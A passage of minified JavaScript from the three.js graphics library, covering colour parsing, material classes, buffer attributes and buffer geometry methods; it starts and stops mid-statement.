0!==t&&parseFloat(t)<1&&console.warn("THREE.Color: Alpha component of "+e+" will be ignored.")}var i;if(i=/^((?:rgb|hsl)a?)\(\s*([^\)]*)\)/.exec(e)){var n,r=i[1],o=i[2];switch(r){case"rgb":case"rgba":if(n=/^(\d+)\s*,\s*(\d+)\s*,\s*(\d+)\s*(,\s*([0-9]*\.?[0-9]+)\s*)?$/.exec(o))return this.r=Math.min(255,parseInt(n[1],10))/255,this.g=Math.min(255,parseInt(n[2],10))/255,this.b=Math.min(255,parseInt(n[3],10))/255,t(n[5]),this;if(n=/^(\d+)\%\s*,\s*(\d+)\%\s*,\s*(\d+)\%\s*(,\s*([0-9]*\.?[0-9]+)\s*)?$/.exec(o))return this.r=Math.min(100,parseInt(n[1],10))/100,this.g=Math.min(100,parseInt(n[2],10))/100,this.b=Math.min(100,parseInt(n[3],10))/100,t(n[5]),this;break;case"hsl":case"hsla":if(n=/^([0-9]*\.?[0-9]+)\s*,\s*(\d+)\%\s*,\s*(\d+)\%\s*(,\s*([0-9]*\.?[0-9]+)\s*)?$/.exec(o)){var a=parseFloat(n[1])/360,s=parseInt(n[2],10)/100,c=parseInt(n[3],10)/100;return t(n[5]),this.setHSL(a,s,c)}}}else if(i=/^\#([A-Fa-f0-9]+)$/.exec(e)){var l=i[1],h=l.length;if(3===h)return this.r=parseInt(l.charAt(0)+l.charAt(0),16)/255,this.g=parseInt(l.charAt(1)+l.charAt(1),16)/255,this.b=parseInt(l.charAt(2)+l.charAt(2),16)/255,this;if(6===h)return this.r=parseInt(l.charAt(0)+l.charAt(1),16)/255,this.g=parseInt(l.charAt(2)+l.charAt(3),16)/255,this.b=parseInt(l.charAt(4)+l.charAt(5),16)/255,this}return e&&e.length>0?this.setColorName(e):this},setColorName:function(e){var t=De[e];return void 0!==t?this.setHex(t):console.warn("THREE.Color: Unknown color "+e),this},clone:function(){return new this.constructor(this.r,this.g,this.b)},copy:function(e){return this.r=e.r,this.g=e.g,this.b=e.b,this},copyGammaToLinear:function(e,t){return void 0===t&&(t=2),this.r=Math.pow(e.r,t),this.g=Math.pow(e.g,t),this.b=Math.pow(e.b,t),this},copyLinearToGamma:function(e,t){void 0===t&&(t=2);var i=t>0?1/t:1;return this.r=Math.pow(e.r,i),this.g=Math.pow(e.g,i),this.b=Math.pow(e.b,i),this},convertGammaToLinear:function(e){return this.copyGammaToLinear(this,e),this},convertLinearToGamma:function(e){return this.copyLinearToGamma(this,e),this},copySRGBToLinear:function(e){return this.r=Ue(e.r),this.g=Ue(e.g),this.b=Ue(e.b),this},copyLinearToSRGB:function(e){return this.r=Ve(e.r),this.g=Ve(e.g),this.b=Ve(e.b),this},convertSRGBToLinear:function(){return this.copySRGBToLinear(this),this},convertLinearToSRGB:function(){return this.copyLinearToSRGB(this),this},getHex:function(){return 255*this.r<<16^255*this.g<<8^255*this.b<<0},getHexString:function(){return("000000"+this.getHex().toString(16)).slice(-6)},getHSL:function(e){void 0===e&&(console.warn("THREE.Color: .getHSL() target is now required"),e={h:0,s:0,l:0});var t,i,n=this.r,r=this.g,o=this.b,a=Math.max(n,r,o),s=Math.min(n,r,o),c=(s+a)/2;if(s===a)t=0,i=0;else{var l=a-s;switch(i=c<=.5?l/(a+s):l/(2-a-s),a){case n:t=(r-o)/l+(r<o?6:0);break;case r:t=(o-n)/l+2;break;case o:t=(n-r)/l+4}t/=6}return e.h=t,e.s=i,e.l=c,e},getStyle:function(){return"rgb("+(255*this.r|0)+","+(255*this.g|0)+","+(255*this.b|0)+")"},offsetHSL:function(e,t,i){return this.getHSL(ze),ze.h+=e,ze.s+=t,ze.l+=i,this.setHSL(ze.h,ze.s,ze.l),this},add:function(e){return this.r+=e.r,this.g+=e.g,this.b+=e.b,this},addColors:function(e,t){return this.r=e.r+t.r,this.g=e.g+t.g,this.b=e.b+t.b,this},addScalar:function(e){return this.r+=e,this.g+=e,this.b+=e,this},sub:function(e){return this.r=Math.max(0,this.r-e.r),this.g=Math.max(0,this.g-e.g),this.b=Math.max(0,this.b-e.b),this},multiply:function(e){return this.r*=e.r,this.g*=e.g,this.b*=e.b,this},multiplyScalar:function(e){return this.r*=e,this.g*=e,this.b*=e,this},lerp:function(e,t){return this.r+=(e.r-this.r)*t,this.g+=(e.g-this.g)*t,this.b+=(e.b-this.b)*t,this},lerpHSL:function(e,t){this.getHSL(ze),e.getHSL(Fe);var i=p.lerp(ze.h,Fe.h,t),n=p.lerp(ze.s,Fe.s,t),r=p.lerp(ze.l,Fe.l,t);return this.setHSL(i,n,r),this},equals:function(e){return e.r===this.r&&e.g===this.g&&e.b===this.b},fromArray:function(e,t){return void 0===t&&(t=0),this.r=e[t],this.g=e[t+1],this.b=e[t+2],this},toArray:function(e,t){return void 0===e&&(e=[]),void 0===t&&(t=0),e[t]=this.r,e[t+1]=this.g,e[t+2]=this.b,e},toJSON:function(){return this.getHex()}}),Ne.NAMES=De,Object.assign(He.prototype,{clone:function(){return(new this.constructor).copy(this)},copy:function(e){this.a=e.a,this.b=e.b,this.c=e.c,this.normal.copy(e.normal),this.color.copy(e.color),this.materialIndex=e.materialIndex;for(var t=0,i=e.vertexNormals.length;t<i;t++)this.vertexNormals[t]=e.vertexNormals[t].clone();for(t=0,i=e.vertexColors.length;t<i;t++)this.vertexColors[t]=e.vertexColors[t].clone();return this}});var Ge=0;function We(){Object.defineProperty(this,"id",{value:Ge++}),this.uuid=p.generateUUID(),this.name="",this.type="Material",this.fog=!0,this.blending=1,this.side=0,this.flatShading=!1,this.vertexTangents=!1,this.vertexColors=0,this.opacity=1,this.transparent=!1,this.blendSrc=204,this.blendDst=205,this.blendEquation=100,this.blendSrcAlpha=null,this.blendDstAlpha=null,this.blendEquationAlpha=null,this.depthFunc=3,this.depthTest=!0,this.depthWrite=!0,this.stencilWriteMask=255,this.stencilFunc=519,this.stencilRef=0,this.stencilFuncMask=255,this.stencilFail=7680,this.stencilZFail=7680,this.stencilZPass=7680,this.stencilWrite=!1,this.clippingPlanes=null,this.clipIntersection=!1,this.clipShadows=!1,this.shadowSide=null,this.colorWrite=!0,this.precision=null,this.polygonOffset=!1,this.polygonOffsetFactor=0,this.polygonOffsetUnits=0,this.dithering=!1,this.alphaTest=0,this.premultipliedAlpha=!1,this.visible=!0,this.toneMapped=!0,this.userData={},this.needsUpdate=!0}function qe(e){We.call(this),this.type="MeshBasicMaterial",this.color=new Ne(16777215),this.map=null,this.lightMap=null,this.lightMapIntensity=1,this.aoMap=null,this.aoMapIntensity=1,this.specularMap=null,this.alphaMap=null,this.envMap=null,this.combine=0,this.reflectivity=1,this.refractionRatio=.98,this.wireframe=!1,this.wireframeLinewidth=1,this.wireframeLinecap="round",this.wireframeLinejoin="round",this.skinning=!1,this.morphTargets=!1,this.setValues(e)}function Xe(e,t,i){if(Array.isArray(e))throw new TypeError("THREE.BufferAttribute: array should be a Typed Array.");this.name="",this._array=e,this._itemSize=t,this.count=void 0!==e?e.length/t:0,this._normalized=!0===i,this.usage=35044,this.updateRange={offset:0,count:-1},this.version=0,this.versionVAO=0}function Ye(e,t,i){Xe.call(this,new Int8Array(e),t,i)}function Ze(e,t,i){Xe.call(this,new Uint8Array(e),t,i)}function Qe(e,t,i){Xe.call(this,new Uint8ClampedArray(e),t,i)}function $e(e,t,i){Xe.call(this,new Int16Array(e),t,i)}function Je(e,t,i){Xe.call(this,new Uint16Array(e),t,i)}function Ke(e,t,i){Xe.call(this,new Int32Array(e),t,i)}function et(e,t,i){Xe.call(this,new Uint32Array(e),t,i)}function tt(e,t,i){Xe.call(this,new Float32Array(e),t,i)}function it(e,t,i){Xe.call(this,new Float64Array(e),t,i)}function nt(){this.vertices=[],this.normals=[],this.colors=[],this.uvs=[],this.uvs2=[],this.groups=[],this.morphTargets={},this.skinWeights=[],this.skinIndices=[],this.boundingBox=null,this.boundingSphere=null,this.verticesNeedUpdate=!1,this.normalsNeedUpdate=!1,this.colorsNeedUpdate=!1,this.uvsNeedUpdate=!1,this.groupsNeedUpdate=!1}function rt(e){if(0===e.length)return-1/0;for(var t=e[0],i=1,n=e.length;i<n;++i)e[i]>t&&(t=e[i]);return t}We.prototype=Object.assign(Object.create(h.prototype),{constructor:We,isMaterial:!0,onBeforeCompile:function(){},setValues:function(e){if(void 0!==e)for(var t in e){var i=e[t];if(void 0!==i)if("shading"!==t){var n=this[t];void 0!==n?n&&n.isColor?n.set(i):n&&n.isVector3&&i&&i.isVector3?n.copy(i):this[t]=i:console.warn("THREE."+this.type+": '"+t+"' is not a property of this material.")}else console.warn("THREE."+this.type+": .shading has been removed. Use the boolean .flatShading instead."),this.flatShading=1===i;else console.warn("THREE.Material: '"+t+"' parameter is undefined.")}},toJSON:function(e){var t=void 0===e||"string"==typeof e;t&&(e={textures:{},images:{}});var i={metadata:{version:4.5,type:"Material",generator:"Material.toJSON"}};function n(e){var t=[];for(var i in e){var n=e[i];delete n.metadata,t.push(n)}return t}if(i.uuid=this.uuid,i.type=this.type,""!==this.name&&(i.name=this.name),this.color&&this.color.isColor&&(i.color=this.color.getHex()),void 0!==this.roughness&&(i.roughness=this.roughness),void 0!==this.metalness&&(i.metalness=this.metalness),this.sheen&&this.sheen.isColor&&(i.sheen=this.sheen.getHex()),this.emissive&&this.emissive.isColor&&(i.emissive=this.emissive.getHex()),this.emissiveIntensity&&1!==this.emissiveIntensity&&(i.emissiveIntensity=this.emissiveIntensity),this.specular&&this.specular.isColor&&(i.specular=this.specular.getHex()),void 0!==this.shininess&&(i.shininess=this.shininess),void 0!==this.clearcoat&&(i.clearcoat=this.clearcoat),void 0!==this.clearcoatRoughness&&(i.clearcoatRoughness=this.clearcoatRoughness),this.clearcoatNormalMap&&this.clearcoatNormalMap.isTexture&&(i.clearcoatNormalMap=this.clearcoatNormalMap.toJSON(e).uuid,i.clearcoatNormalScale=this.clearcoatNormalScale.toArray()),this.map&&this.map.isTexture&&(i.map=this.map.toJSON(e).uuid),this.matcap&&this.matcap.isTexture&&(i.matcap=this.matcap.toJSON(e).uuid),this.alphaMap&&this.alphaMap.isTexture&&(i.alphaMap=this.alphaMap.toJSON(e).uuid),this.lightMap&&this.lightMap.isTexture&&(i.lightMap=this.lightMap.toJSON(e).uuid),this.aoMap&&this.aoMap.isTexture&&(i.aoMap=this.aoMap.toJSON(e).uuid,i.aoMapIntensity=this.aoMapIntensity),this.bumpMap&&this.bumpMap.isTexture&&(i.bumpMap=this.bumpMap.toJSON(e).uuid,i.bumpScale=this.bumpScale),this.normalMap&&this.normalMap.isTexture&&(i.normalMap=this.normalMap.toJSON(e).uuid,i.normalMapType=this.normalMapType,i.normalScale=this.normalScale.toArray()),this.displacementMap&&this.displacementMap.isTexture&&(i.displacementMap=this.displacementMap.toJSON(e).uuid,i.displacementScale=this.displacementScale,i.displacementBias=this.displacementBias),this.roughnessMap&&this.roughnessMap.isTexture&&(i.roughnessMap=this.roughnessMap.toJSON(e).uuid),this.metalnessMap&&this.metalnessMap.isTexture&&(i.metalnessMap=this.metalnessMap.toJSON(e).uuid),this.emissiveMap&&this.emissiveMap.isTexture&&(i.emissiveMap=this.emissiveMap.toJSON(e).uuid),this.specularMap&&this.specularMap.isTexture&&(i.specularMap=this.specularMap.toJSON(e).uuid),this.envMap&&this.envMap.isTexture&&(i.envMap=this.envMap.toJSON(e).uuid,i.reflectivity=this.reflectivity,i.refractionRatio=this.refractionRatio,void 0!==this.combine&&(i.combine=this.combine),void 0!==this.envMapIntensity&&(i.envMapIntensity=this.envMapIntensity)),this.gradientMap&&this.gradientMap.isTexture&&(i.gradientMap=this.gradientMap.toJSON(e).uuid),void 0!==this.size&&(i.size=this.size),void 0!==this.sizeAttenuation&&(i.sizeAttenuation=this.sizeAttenuation),1!==this.blending&&(i.blending=this.blending),!0===this.flatShading&&(i.flatShading=this.flatShading),0!==this.side&&(i.side=this.side),0!==this.vertexColors&&(i.vertexColors=this.vertexColors),this.opacity<1&&(i.opacity=this.opacity),!0===this.transparent&&(i.transparent=this.transparent),i.depthFunc=this.depthFunc,i.depthTest=this.depthTest,i.depthWrite=this.depthWrite,i.stencilWrite=this.stencilWrite,i.stencilWriteMask=this.stencilWriteMask,i.stencilFunc=this.stencilFunc,i.stencilRef=this.stencilRef,i.stencilFuncMask=this.stencilFuncMask,i.stencilFail=this.stencilFail,i.stencilZFail=this.stencilZFail,i.stencilZPass=this.stencilZPass,this.rotation&&0!==this.rotation&&(i.rotation=this.rotation),!0===this.polygonOffset&&(i.polygonOffset=!0),0!==this.polygonOffsetFactor&&(i.polygonOffsetFactor=this.polygonOffsetFactor),0!==this.polygonOffsetUnits&&(i.polygonOffsetUnits=this.polygonOffsetUnits),this.linewidth&&1!==this.linewidth&&(i.linewidth=this.linewidth),void 0!==this.dashSize&&(i.dashSize=this.dashSize),void 0!==this.gapSize&&(i.gapSize=this.gapSize),void 0!==this.scale&&(i.scale=this.scale),!0===this.dithering&&(i.dithering=!0),this.alphaTest>0&&(i.alphaTest=this.alphaTest),!0===this.premultipliedAlpha&&(i.premultipliedAlpha=this.premultipliedAlpha),!0===this.wireframe&&(i.wireframe=this.wireframe),this.wireframeLinewidth>1&&(i.wireframeLinewidth=this.wireframeLinewidth),"round"!==this.wireframeLinecap&&(i.wireframeLinecap=this.wireframeLinecap),"round"!==this.wireframeLinejoin&&(i.wireframeLinejoin=this.wireframeLinejoin),!0===this.morphTargets&&(i.morphTargets=!0),!0===this.morphNormals&&(i.morphNormals=!0),!0===this.skinning&&(i.skinning=!0),!1===this.visible&&(i.visible=!1),!1===this.toneMapped&&(i.toneMapped=!1),"{}"!==JSON.stringify(this.userData)&&(i.userData=this.userData),t){var r=n(e.textures),o=n(e.images);r.length>0&&(i.textures=r),o.length>0&&(i.images=o)}return i},clone:function(){return(new this.constructor).copy(this)},copy:function(e){this.name=e.name,this.fog=e.fog,this.blending=e.blending,this.side=e.side,this.flatShading=e.flatShading,this.vertexColors=e.vertexColors,this.opacity=e.opacity,this.transparent=e.transparent,this.blendSrc=e.blendSrc,this.blendDst=e.blendDst,this.blendEquation=e.blendEquation,this.blendSrcAlpha=e.blendSrcAlpha,this.blendDstAlpha=e.blendDstAlpha,this.blendEquationAlpha=e.blendEquationAlpha,this.depthFunc=e.depthFunc,this.depthTest=e.depthTest,this.depthWrite=e.depthWrite,this.stencilWrite=e.stencilWrite,this.stencilWriteMask=e.stencilWriteMask,this.stencilFunc=e.stencilFunc,this.stencilRef=e.stencilRef,this.stencilFuncMask=e.stencilFuncMask,this.stencilFail=e.stencilFail,this.stencilZFail=e.stencilZFail,this.stencilZPass=e.stencilZPass,this.colorWrite=e.colorWrite,this.precision=e.precision,this.polygonOffset=e.polygonOffset,this.polygonOffsetFactor=e.polygonOffsetFactor,this.polygonOffsetUnits=e.polygonOffsetUnits,this.dithering=e.dithering,this.alphaTest=e.alphaTest,this.premultipliedAlpha=e.premultipliedAlpha,this.visible=e.visible,this.toneMapped=e.toneMapped,this.userData=JSON.parse(JSON.stringify(e.userData)),this.clipShadows=e.clipShadows,this.clipIntersection=e.clipIntersection;var t=e.clippingPlanes,i=null;if(null!==t){var n=t.length;i=new Array(n);for(var r=0;r!==n;++r)i[r]=t[r].clone()}return this.clippingPlanes=i,this.shadowSide=e.shadowSide,this},dispose:function(){this.dispatchEvent({type:"dispose"})}}),qe.prototype=Object.create(We.prototype),qe.prototype.constructor=qe,qe.prototype.isMeshBasicMaterial=!0,qe.prototype.copy=function(e){return We.prototype.copy.call(this,e),this.color.copy(e.color),this.map=e.map,this.lightMap=e.lightMap,this.lightMapIntensity=e.lightMapIntensity,this.aoMap=e.aoMap,this.aoMapIntensity=e.aoMapIntensity,this.specularMap=e.specularMap,this.alphaMap=e.alphaMap,this.envMap=e.envMap,this.combine=e.combine,this.reflectivity=e.reflectivity,this.refractionRatio=e.refractionRatio,this.wireframe=e.wireframe,this.wireframeLinewidth=e.wireframeLinewidth,this.wireframeLinecap=e.wireframeLinecap,this.wireframeLinejoin=e.wireframeLinejoin,this.skinning=e.skinning,this.morphTargets=e.morphTargets,this},Object.defineProperties(Xe.prototype,{needsUpdate:{set:function(e){!0===e&&this.version++}},array:{get:function(){return this._array},set:function(e){this._array=e,this.versionVAO++}},itemSize:{get:function(){return this._itemSize},set:function(e){this._itemSize=e,this.versionVAO++}},normalized:{get:function(){return this._normalized},set:function(e){this._normalized=e,this.versionVAO++}}}),Object.assign(Xe.prototype,{isBufferAttribute:!0,onUploadCallback:function(){},setUsage:function(e){return this.usage=e,this},copy:function(e){return this.name=e.name,this.array=new e.array.constructor(e.array),this.itemSize=e.itemSize,this.count=e.count,this.normalized=e.normalized,this.usage=e.usage,this},copyAt:function(e,t,i){e*=this.itemSize,i*=t.itemSize;for(var n=0,r=this.itemSize;n<r;n++)this.array[e+n]=t.array[i+n];return this},copyArray:function(e){return this.array.set(e),this},copyColorsArray:function(e){for(var t=this.array,i=0,n=0,r=e.length;n<r;n++){var o=e[n];void 0===o&&(console.warn("THREE.BufferAttribute.copyColorsArray(): color is undefined",n),o=new Ne),t[i++]=o.r,t[i++]=o.g,t[i++]=o.b}return this},copyVector2sArray:function(e){for(var t=this.array,i=0,n=0,r=e.length;n<r;n++){var o=e[n];void 0===o&&(console.warn("THREE.BufferAttribute.copyVector2sArray(): vector is undefined",n),o=new f),t[i++]=o.x,t[i++]=o.y}return this},copyVector3sArray:function(e){for(var t=this.array,i=0,n=0,r=e.length;n<r;n++){var o=e[n];void 0===o&&(console.warn("THREE.BufferAttribute.copyVector3sArray(): vector is undefined",n),o=new y),t[i++]=o.x,t[i++]=o.y,t[i++]=o.z}return this},copyVector4sArray:function(e){for(var t=this.array,i=0,n=0,r=e.length;n<r;n++){var o=e[n];void 0===o&&(console.warn("THREE.BufferAttribute.copyVector4sArray(): vector is undefined",n),o=new T),t[i++]=o.x,t[i++]=o.y,t[i++]=o.z,t[i++]=o.w}return this},set:function(e,t){return void 0===t&&(t=0),this.array.set(e,t),this},getX:function(e){return this.array[e*this.itemSize]},setX:function(e,t){return this.array[e*this.itemSize]=t,this},getY:function(e){return this.array[e*this.itemSize+1]},setY:function(e,t){return this.array[e*this.itemSize+1]=t,this},getZ:function(e){return this.array[e*this.itemSize+2]},setZ:function(e,t){return this.array[e*this.itemSize+2]=t,this},getW:function(e){return this.array[e*this.itemSize+3]},setW:function(e,t){return this.array[e*this.itemSize+3]=t,this},setXY:function(e,t,i){return e*=this.itemSize,this.array[e+0]=t,this.array[e+1]=i,this},setXYZ:function(e,t,i,n){return e*=this.itemSize,this.array[e+0]=t,this.array[e+1]=i,this.array[e+2]=n,this},setXYZW:function(e,t,i,n,r){return e*=this.itemSize,this.array[e+0]=t,this.array[e+1]=i,this.array[e+2]=n,this.array[e+3]=r,this},onUpload:function(e){return this.onUploadCallback=e,this},clone:function(){return new this.constructor(this.array,this.itemSize).copy(this)},toJSON:function(){return{itemSize:this.itemSize,type:this.array.constructor.name,array:Array.prototype.slice.call(this.array),normalized:this.normalized}}}),Ye.prototype=Object.create(Xe.prototype),Ye.prototype.constructor=Ye,Ze.prototype=Object.create(Xe.prototype),Ze.prototype.constructor=Ze,Qe.prototype=Object.create(Xe.prototype),Qe.prototype.constructor=Qe,$e.prototype=Object.create(Xe.prototype),$e.prototype.constructor=$e,Je.prototype=Object.create(Xe.prototype),Je.prototype.constructor=Je,Ke.prototype=Object.create(Xe.prototype),Ke.prototype.constructor=Ke,et.prototype=Object.create(Xe.prototype),et.prototype.constructor=et,tt.prototype=Object.create(Xe.prototype),tt.prototype.constructor=tt,it.prototype=Object.create(Xe.prototype),it.prototype.constructor=it,Object.assign(nt.prototype,{computeGroups:function(e){for(var t,i=[],n=void 0,r=e.faces,o=0;o<r.length;o++){var a=r[o];a.materialIndex!==n&&(n=a.materialIndex,void 0!==t&&(t.count=3*o-t.start,i.push(t)),t={start:3*o,materialIndex:n})}void 0!==t&&(t.count=3*o-t.start,i.push(t)),this.groups=i},fromGeometry:function(e){var t,i=e.faces,n=e.vertices,r=e.faceVertexUvs,o=r[0]&&r[0].length>0,a=r[1]&&r[1].length>0,s=e.morphTargets,c=s.length;if(c>0){t=[];for(var l=0;l<c;l++)t[l]={name:s[l].name,data:[]};this.morphTargets.position=t}var h,u=e.morphNormals,d=u.length;if(d>0){h=[];for(l=0;l<d;l++)h[l]={name:u[l].name,data:[]};this.morphTargets.normal=h}var p=e.skinIndices,m=e.skinWeights,v=p.length===n.length,g=m.length===n.length;n.length>0&&0===i.length&&console.error("THREE.DirectGeometry: Faceless geometries are not supported.");for(l=0;l<i.length;l++){var y=i[l];this.vertices.push(n[y.a],n[y.b],n[y.c]);var b=y.vertexNormals;if(3===b.length)this.normals.push(b[0],b[1],b[2]);else{var w=y.normal;this.normals.push(w,w,w)}var x,_=y.vertexColors;if(3===_.length)this.colors.push(_[0],_[1],_[2]);else{var M=y.color;this.colors.push(M,M,M)}if(!0===o)void 0!==(x=r[0][l])?this.uvs.push(x[0],x[1],x[2]):(console.warn("THREE.DirectGeometry.fromGeometry(): Undefined vertexUv ",l),this.uvs.push(new f,new f,new f));if(!0===a)void 0!==(x=r[1][l])?this.uvs2.push(x[0],x[1],x[2]):(console.warn("THREE.DirectGeometry.fromGeometry(): Undefined vertexUv2 ",l),this.uvs2.push(new f,new f,new f));for(var S=0;S<c;S++){var T=s[S].vertices;t[S].data.push(T[y.a],T[y.b],T[y.c])}for(S=0;S<d;S++){var E=u[S].vertexNormals[l];h[S].data.push(E.a,E.b,E.c)}v&&this.skinIndices.push(p[y.a],p[y.b],p[y.c]),g&&this.skinWeights.push(m[y.a],m[y.b],m[y.c])}return this.computeGroups(e),this.verticesNeedUpdate=e.verticesNeedUpdate,this.normalsNeedUpdate=e.normalsNeedUpdate,this.colorsNeedUpdate=e.colorsNeedUpdate,this.uvsNeedUpdate=e.uvsNeedUpdate,this.groupsNeedUpdate=e.groupsNeedUpdate,null!==e.boundingSphere&&(this.boundingSphere=e.boundingSphere.clone()),null!==e.boundingBox&&(this.boundingBox=e.boundingBox.clone()),this}});var ot=1,at=new B,st=new K,ct=new y,lt=new pe,ht=new pe,ut=new y;function dt(){Object.defineProperty(this,"id",{value:ot+=2}),this.uuid=p.generateUUID(),this.name="",this.type="BufferGeometry",this.index=null,this.attributes={},this.morphAttributes={},this.groups=[],this.boundingBox=null,this.boundingSphere=null,this.drawRange={start:0,count:1/0},this.userData={}}dt.prototype=Object.assign(Object.create(h.prototype),{constructor:dt,isBufferGeometry:!0,getIndex:function(){return this.index},setIndex:function(e){Array.isArray(e)?this.index=new(rt(e)>65535?et:Je)(e,1):this.index=e},addAttribute:function(e,t){return t&&t.isBufferAttribute||t&&t.isInterleavedBufferAttribute?"index"===e?(console.warn("THREE.BufferGeometry.addAttribute: Use .setIndex() for index attribute."),this.setIndex(t),this):this.setAttribute(e,t):(console.warn("THREE.BufferGeometry: .addAttribute() now expects ( name, attribute )."),this.addAttribute(e,new Xe(arguments[1],arguments[2])))},getAttribute:function(e){return this.attributes[e]},setAttribute:function(e,t){return this.attributes[e]=t,this},removeAttribute:function(e){return delete this.attributes[e],this},addGroup:function(e,t,i){this.groups.push({start:e,count:t,materialIndex:void 0!==i?i:0})},clearGroups:function(){this.groups=[]},setDrawRange:function(e,t){this.drawRange.start=e,this.drawRange.count=t},applyMatrix:function(e){var t=this.attributes.position;void 0!==t&&(e.applyToBufferAttribute(t),t.needsUpdate=!0);var i=this.attributes.normal;void 0!==i&&((new x).getNormalMatrix(e).applyToBufferAttribute(i),i.needsUpdate=!0);var n=this.attributes.tangent;void 0!==n&&((new x).getNormalMatrix(e).applyToBufferAttribute(n),n.needsUpdate=!0);return null!==this.boundingBox&&this.computeBoundingBox(),null!==this.boundingSphere&&this.computeBoundingSphere(),this},rotateX:function(e){return at.makeRotationX(e),this.applyMatrix(at),this},rotateY:function(e){return at.makeRotationY(e),this.applyMatrix(at),this},rotateZ:function(e){return at.makeRotationZ(e),this.applyMatrix(at),this},translate:function(e,t,i){return at.makeTranslation(e,t,i),this.applyMatrix(at),this},scale:function(e,t,i){return at.makeScale(e,t,i),this.applyMatrix(at),this},lookAt:function(e){return st.lookAt(e),st.updateMatrix(),this.applyMatrix(st.matrix),this},center:function(){return this.computeBoundingBox(),this.boundingBox.getCenter(ct).negate(),this.translate(ct.x,ct.y,ct.z),this},setFromObject:function(e){var t=e.geometry;if(e.isPoints||e.isLine){var i=new tt(3*t.vertices.length,3),n=new tt(3*t.colors.length,3);if(this.addAttribute("position",i.copyVector3sArray(t.vertices)),this.addAttribute("color",n.copyColorsArray(t.colors)),t.lineDistances&&t.lineDistances.length===t.vertices.length){var r=new tt(t.lineDistances.length,1);this.addAttribute("lineDistance",r.copyArray(t.lineDistances))}null!==t.boundingSphere&&(this.boundingSphere=t.boundingSphere.clone()),null!==t.boundingBox&&(this.boundingBox=t.boundingBox.clone())}else e.isMesh&&t&&t.isGeometry&&this.fromGeometry(t);return this},setFromPoints:function(e){for(var t=[],i=0,n=e.length;i<n;i++){var r=e[i];t.push(r.x,r.y,r.z||0)}return this.addAttribute("position",new tt(t,3)),this},updateFromObject:function(e){var t,i=e.geometry;if(e.isMesh){var n=i.__directGeometry;if(!0===i.elementsNeedUpdate&&(n=void 0,i.elementsNeedUpdate=!1),void 0===n)return this.fromGeometry(i);n.verticesNeedUpdate=i.verticesNeedUpdate,n.normalsNeedUpdate=i.normalsNeedUpdate,n.colorsNeedUpdate=i.colorsNeedUpdate,n.uvsNeedUpdate=i.uvsNeedUpdate,n.groupsNeedUpdate=i.groupsNeedUpdate,i.verticesNeedUpdate=!1,i.normalsNeedUpdate=!1,i.colorsNeedUpdate=!1,i.uvsNeedUpdate=!1,i.groupsNeedUpdate=!1,i=n}return!0===i.verticesNeedUpdate&&(void 0!==(t=this.attributes.position)&&(t.copyVector3sArray(i.vertices),t.needsUpdate=!0),i.verticesNeedUpdate=!1),!0===i.normalsNeedUpdate&&(void 0!==(t=this.attributes.normal)&&(t.copyVector3sArray(i.normals),t.needsUpdate=!0),i.normalsNeedUpdate=!1),!0===i.colorsNeedUpdate&&(void 0!==(t=this.attributes.color)&&(t.copyColorsArray(i.colors),t.needsUpdate=!0),i.colorsNeedUpdate=!1),i.uvsNeedUpdate&&(void 0!==(t=this.attributes.uv)&&(t.copyVector2sArray(i.uvs),t.needsUpdate=!0),i.uvsNeedUpdate=!1),i.lineDistancesNeedUpdate&&(void 0!==(t=this.attributes.lineDistance)&&(t.copyArray(i.lineDistances),t.needsUpdate=!0),i.lineDistancesNeedUpdate=!1),i.groupsNeedUpdate&&(i.computeGroups(e.geometry),this.groups=i.groups,i.groupsNeedUpdate=!1),this},fromGeometry:function(e){return e.__directGeometry=(new nt).fromGeometry(e),this.fromDirectGeometry(e.__directGeometry)},fromDirectGeometry:function(e){var t=new Float32Array(3*e.vertices.length);if(this.addAttribute("position",new Xe(t,3).copyVector3sArray(e.vertices)),e.normals.length>0){var i=new Float32Array(3*e.normals.length);this.addAttribute("normal",new Xe(i,3).copyVector3sArray(e.normals))}if(e.colors.length>0){var n=new Float32Array(3*e.colors.length);this.addAttribute("color",new Xe(n,3).copyColorsArray(e.colors))}if(e.uvs.length>0){var r=new Float32Array(2*e.uvs.length);this.addAttribute("uv",new Xe(r,2).copyVector2sArray(e.uvs))}if(e.uvs2.length>0){var o=new Float32Array(2*e.uvs2.length);this.addAttribute("uv2",new Xe(o,2).copyVector2sArray(e.uvs2))}for(var a in this.groups=e.groups,e.morphTargets){for(var s=[],c=e.morphTargets[a],l=0,h=c.length;l<h;l++){var u=c[l],d=new tt(3*u.data.length,3);d.name=u.name,s.push(d.copyVector3sArray(u.data))}this.morphAttributes[a]=s}if(e.skinIndices.length>0){var p=new tt(4*e.skinIndices.length,4);this.addAttribute("skinIndex",p.copyVector4sArray(e.skinIndices))}if(e.skinWeights.length>0){var f=new tt(4*e.skinWeights.length,4);this.addAttribute("skinWeight",f.copyVector4sArray(e.skinWeights))}return null!==e.boundingSphere&&(this.boundingSphere=e.boundingSphere.clone()),null!==e.boundingBox&&(this.boundingBox=e.boundingBox.clone()),this},computeBoundingBox:function(){null===this.boundingBox&&(this.boundingBox=new pe);var e=this.attributes.position,t=this.morphAttributes.position;if(void 0!==e){if(this.boundingBox.setFromBufferAttribute(e),t)for(var i=0,n=t.length;i<n;i++){var r=t[i];lt.setFromBufferAttribute(r),this.boundingBox.expandByPoint(lt.min),this.boundingBox.expandByPoint(lt.max)}}else this.boundingBox.makeEmpty();(isNaN(this.boundingBox.min.x)||isNaN(this.boundingBox.min.y)||isNaN(this.boundingBox.min.z))&&console.error('THREE.BufferGeometry.computeBoundingBox: Computed min/max have NaN values. The "position" attribute is likely to have NaN values.',this)},computeBoundingSphere:function(){null===this.boundingSphere&&(this.boundingSphere=new ve);var e=this.attributes.position,t=this.morphAttributes.position;if(e){var i=this.boundingSphere.center;if(lt.setFromBufferAttribute(e),t)for(var n=0,r=t.length;n<r;n++){var o=t[n];ht.setFromBufferAttribute(o),lt.expandByPoint(ht.min),lt.expandByPoint(ht.max)}lt.getCenter(i);var a=0;for(n=0,r=e.count;n<r;n++)ut.fromBufferAttribute(e,n),a=Math.max(a,i.distanceToSquared(ut));if(t)for(n=0,r=t.length;n<r;n++)for(var s=0,c=(o=t[n]).count;s<c;s++)ut.fromBufferAttribute(o,s),a=Math.max(a,i.distanceToSquared(ut));this.boundingSphere.radius=Math.sqrt(a),isNaN(this.boundingSphere.radius)&&console.error('THREE.BufferGeometry.computeBoundingSphere(): Computed radius is NaN. The "position" attribute is likely to have NaN values.',this)}},computeFaceNormals:function(){},computeVertexNormals:function(){var e=this.index,t=this.attributes;if(t.position){var i=t.position.array;if(void 0===t.normal)this.addAttribute("normal",new Xe(new 